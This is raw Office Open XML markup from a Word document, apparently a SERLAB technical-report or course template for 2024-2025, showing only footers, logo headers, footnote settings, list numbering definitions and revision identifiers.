        <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:t>a.a</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r w:rsidRPr="4E46F641">
      <w:rPr>
        <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:t>. 2024-2025</w:t>
    </w:r>
    <w:r w:rsidR="001A39A9">
      <w:tab/>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:instrText>PAGE</w:instrText>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="005432B6">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>2</w:t>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:t>/</w:t>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:instrText>NUMPAGES</w:instrText>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="005432B6">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>3</w:t>
    </w:r>
    <w:r w:rsidR="001A39A9" w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r w:rsidR="001A39A9">
      <w:tab/>
    </w:r>
    <w:r w:rsidRPr="4E46F641">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="722B00AE" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
    <w:pPr>
      <w:pBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8280"/>
      </w:tabs>
      <w:jc w:val="center"/>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>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E11D2A" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
    <w:pPr>
      <w:pBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8280"/>
      </w:tabs>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:drawing>
        <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0DE54CD0" wp14:editId="07777777">
          <wp:extent cx="3724912" cy="637377"/>
          <wp:effectExtent l="0" t="0" r="0" b="0"/>
          <wp:docPr id="14" name="image16.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:TECHNICAL REPORT:SERLAB_INTESTAZIONE-08.png"/>
          <wp:cNvGraphicFramePr/>
          <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
              <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:nvPicPr>
                  <pic:cNvPr id="0" name="image16.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:TECHNICAL REPORT:SERLAB_INTESTAZIONE-08.png"/>
                  <pic:cNvPicPr preferRelativeResize="0"/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId1"/>
                  <a:srcRect/>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="3724912" cy="637377"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:ln/>
                </pic:spPr>
              </pic:pic>
            </a:graphicData>
          </a:graphic>
        </wp:inline>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51AC782" w14:textId="77777777" w:rsidR="00A23FFF" w:rsidRDefault="00A23FFF">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="66D58A60" w14:textId="77777777" w:rsidR="00A23FFF" w:rsidRDefault="00A23FFF">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="5AD954A2" w14:textId="77777777" w:rsidR="00A23FFF" w:rsidRDefault="00A23FFF">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
  </w:footnote>
  <w:footnote w:id="2">
    <w:p w14:paraId="67FE1D1E" w14:textId="77777777" w:rsidR="00445E86" w:rsidRPr="007B428D" w:rsidRDefault="00445E86" w:rsidP="00445E86">
      <w:pPr>
        <w:pStyle w:val="Testonotaapidipagina"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Rimandonotaapidipagina"/>
        </w:rPr>
        <w:footnoteRef/>
      </w:r>
      <w:r w:rsidRPr="007B428D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Provided in the e-learning platform</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CC5E94" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="6" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="left" w:pos="7530"/>
        <w:tab w:val="right" w:pos="9026"/>
      </w:tabs>
      <w:spacing w:after="120"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="57BDCDF7" wp14:editId="07777777">
          <wp:extent cx="2120248" cy="512610"/>
          <wp:effectExtent l="0" t="0" r="0" b="0"/>
          <wp:docPr id="39" name="image23.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:LOGO:NUOVO:SERLAB_LOGO_B.png"/>
          <wp:cNvGraphicFramePr/>
          <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
              <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:nvPicPr>
                  <pic:cNvPr id="0" name="image23.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:LOGO:NUOVO:SERLAB_LOGO_B.png"/>
                  <pic:cNvPicPr preferRelativeResize="0"/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId1"/>
                  <a:srcRect/>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="2120248" cy="512610"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:ln/>
                </pic:spPr>
              </pic:pic>
            </a:graphicData>
          </a:graphic>
        </wp:inline>
      </w:drawing>
    </w:r>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="251658240" behindDoc="1" locked="0" layoutInCell="1" hidden="0" allowOverlap="1" wp14:anchorId="6C31AA71" wp14:editId="07777777">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="column">
            <wp:posOffset>-770889</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="paragraph">
            <wp:posOffset>-428624</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="327752" cy="10691495"/>
          <wp:effectExtent l="0" t="0" r="0" b="0"/>
          <wp:wrapNone/>
          <wp:docPr id="28" name="image40.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:TECHNICAL REPORT:SERLAB_BARRA_LAT-09.png"/>
          <wp:cNvGraphicFramePr/>
          <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
              <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:nvPicPr>
                  <pic:cNvPr id="0" name="image40.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:TECHNICAL REPORT:SERLAB_BARRA_LAT-09.png"/>
                  <pic:cNvPicPr preferRelativeResize="0"/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId2"/>
                  <a:srcRect/>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="327752" cy="10691495"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>
                  <a:ln/>
                </pic:spPr>
              </pic:pic>
            </a:graphicData>
          </a:graphic>
        </wp:anchor>
      </w:drawing>
    </w:r>
  </w:p>
  <w:p w14:paraId="2DE403A5" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="6" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="left" w:pos="7530"/>
        <w:tab w:val="right" w:pos="9026"/>
      </w:tabs>
      <w:spacing w:after="120"/>
      <w:jc w:val="center"/>
      <w:rPr>
        <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
      </w:rPr>
    </w:pPr>
  </w:p>
  <w:p w14:paraId="62431CDC" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4153"/>
        <w:tab w:val="right" w:pos="8306"/>
      </w:tabs>
      <w:spacing w:after="120"/>
      <w:jc w:val="cent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126E5D" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4153"/>
        <w:tab w:val="right" w:pos="8306"/>
      </w:tabs>
      <w:spacing w:after="120"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B3FE73F" wp14:editId="07777777">
          <wp:extent cx="2674117" cy="646519"/>
          <wp:effectExtent l="0" t="0" r="0" b="0"/>
          <wp:docPr id="24" name="image10.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:LOGO:NUOVO:SERLAB_LOGO_B.png"/>
          <wp:cNvGraphicFramePr/>
          <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
              <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:nvPicPr>
                  <pic:cNvPr id="0" name="image10.png" descr="Macintosh HD:Users:mac:Documents:VIDEO:ULTIME S&amp;P:SERLAB:LOGO:NUOVO:SERLAB_LOGO_B.png"/>
                  <pic:cNvPicPr preferRelativeResize="0"/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId1"/>
                  <a:srcRect/>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="2674117" cy="646519"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>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3A7B0E"/>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3685AC4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C8EA40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511077C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B286394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0E295B9C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6CD240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18F5DA7"/>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77B0139"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="390E48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BA37846"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="575A9FD4"/>
    <w:lvl w:ilvl="0" w:tplc="78BE74B2">
      <w:start w:val="5"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Lucida Sans" w:eastAsia="Lucida Sans" w:hAnsi="Lucida Sans" w:cs="Lucida San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1C175956"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C21C3F74"/>
    <w:lvl w:ilvl="0" w:tplc="BA140126">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:lang w:val="it"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="04100019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1003" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="0410001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1723" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0410000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2443" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="04100019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3163" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="0410001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="3883" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="0410000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4603" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="04100019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5323" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0410001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6043" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1CAA52D9"/>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0E22AC9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="53CA0436"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="Titolo1"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="Titolo2"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7.%8"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7.%8.%9"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2A5A05D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1CEE54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F020C93"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="163E93E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pStyle w:val="Titolo3"/>
      <w:lvlText w:val="%1.%2.%3."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1224" w:hanging="504"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>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3590266A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B39E67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7643099"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="156C5306"/>
    <w:lvl w:ilvl="0" w:tplc="B154729E">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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3D5773AC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9C7A664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3E114335"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="28FA6C7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4C0E08BB"/>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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4FDD12CD"/>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5465693D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="35EE506A"/>
    <w:lvl w:ilvl="0" w:tplc="4254224E">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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="64C81D00"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9FF2A7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BF327D9"/>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943998658">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="210651312">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="637035519">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1398936012">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2038578934">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1602490312">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="961959719">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1395660030">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1383169694">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1173645360">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1758598182">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="366493955">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="675426590">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="938412433">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="601035958">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="413867805">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="750931569">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1491865437">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1751930596">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="1075129038">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="545872096">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4"/>
  <w:embedTrueTypeFonts/>
  <w:proofState w:spelling="clean" w:grammar="clean"/>
  <w:defaultTabStop w:val="720"/>
  <w:hyphenationZone w:val="283"/>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10649"/>
    <w:rsid w:val="00000362"/>
    <w:rsid w:val="0000184C"/>
    <w:rsid w:val="000022C0"/>
    <w:rsid w:val="0000550F"/>
    <w:rsid w:val="00013278"/>
    <w:rsid w:val="00016412"/>
    <w:rsid w:val="00017304"/>
    <w:rsid w:val="000205E5"/>
    <w:rsid w:val="00024095"/>
    <w:rsid w:val="00027E07"/>
    <w:rsid w:val="00027F72"/>
    <w:rsid w:val="0003382D"/>
    <w:rsid w:val="00034671"/>
    <w:rsid w:val="00034938"/>
    <w:rsid w:val="00042884"/>
    <w:rsid w:val="000430FA"/>
    <w:rsid w:val="00046A20"/>
    <w:rsid w:val="00047EAF"/>
    <w:rsid w:val="00055030"/>
    <w:rsid w:val="000570EE"/>
    <w:rsid w:val="000574D5"/>
    <w:rsid w:val="000641C6"/>
    <w:rsid w:val="00064CF4"/>
    <w:rsid w:val="00064D63"/>
    <w:rsid w:val="00066138"/>
    <w:rsid w:val="00073900"/>
    <w:rsid w:val="00077668"/>
    <w:rsid w:val="000777E4"/>
    <w:rsid w:val="0008183E"/>
    <w:rsid w:val="000824BD"/>
    <w:rsid w:val="00084A87"/>
    <w:rsid w:val="00086144"/>
    <w:rsid w:val="0008629C"/>
    <w:rsid w:val="00086451"/>
    <w:rsid w:val="0009247A"/>
    <w:rsid w:val="0009462D"/>
    <w:rsid w:val="00096034"/>
    <w:rsid w:val="000A31DA"/>
    <w:rsid w:val="000A5824"/>
    <w:rsid w:val="000A63AF"/>
    <w:rsid w:val="000B0075"/>
    <w:rsid w:val="000B07DF"/>
    <w:rsid w:val="000B0EE8"/>
    <w:rsid w:val="000B7643"/>
    <w:rsid w:val="000C0870"/>
    <w:rsid w:val="000C17E1"/>
    <w:rsid w:val="000C288B"/>
    <w:rsid w:val="000C41E6"/>
    <w:rsid w:val="000C59D6"/>
    <w:rsid w:val="000C5E6D"/>
    <w:rsid w:val="000D3612"/>
    <w:rsid w:val="000D38D0"/>
    <w:rsid w:val="000D4085"/>
    <w:rsid w:val="000D6D53"/>
    <w:rsid w:val="000E5DCF"/>
    <w:rsid w:val="000F0A1F"/>
    <w:rsid w:val="000F34DB"/>
    <w:rsid w:val="000F6EFA"/>
    <w:rsid w:val="000F7E61"/>
    <w:rsid w:val="00100EB1"/>
    <w:rsid w:val="00102427"/>
    <w:rsid w:val="00102695"/>
    <w:rsid w:val="00102BBD"/>
    <w:rsid w:val="00114EF3"/>
    <w:rsid w:val="00115209"/>
    <w:rsid w:val="00116678"/>
    <w:rsid w:val="0011668E"/>
    <w:rsid w:val="001237B1"/>
    <w:rsid w:val="00124F89"/>
    <w:rsid w:val="00125870"/>
    <w:rsid w:val="00126D1C"/>
    <w:rsid w:val="001321E6"/>
    <w:rsid w:val="001331E4"/>
    <w:rsid w:val="001362BD"/>
    <w:rsid w:val="001425CA"/>
    <w:rsid w:val="00146C5D"/>
    <w:rsid w:val="001507EF"/>
    <w:rsid w:val="00151035"/>
    <w:rsid w:val="00163A5E"/>
    <w:rsid w:val="0017119D"/>
    <w:rsid w:val="00175227"/>
    <w:rsid w:val="001774F5"/>
    <w:rsid w:val="00177DBD"/>
    <w:rsid w:val="00181007"/>
    <w:rsid w:val="00184E86"/>
    <w:rsid w:val="00186DB0"/>
    <w:rsid w:val="00187713"/>
    <w:rsid w:val="00190420"/>
    <w:rsid w:val="001A39A9"/>
    <w:rsid w:val="001A5DA6"/>
    <w:rsid w:val="001A7890"/>
    <w:rsid w:val="001B4300"/>
    <w:rsid w:val="001B4D70"/>
    <w:rsid w:val="001B70B1"/>
    <w:rsid w:val="001C339C"/>
    <w:rsid w:val="001D08D9"/>
    <w:rsid w:val="001D306B"/>
    <w:rsid w:val="001E1D0F"/>
    <w:rsid w:val="001E5664"/>
    <w:rsid w:val="001E79DD"/>
    <w:rsid w:val="001F114B"/>
    <w:rsid w:val="001F1A81"/>
    <w:rsid w:val="001F3CD0"/>
    <w:rsid w:val="001F61D1"/>
    <w:rsid w:val="001F78BF"/>
    <w:rsid w:val="0020284C"/>
    <w:rsid w:val="002039E1"/>
    <w:rsid w:val="00205EE2"/>
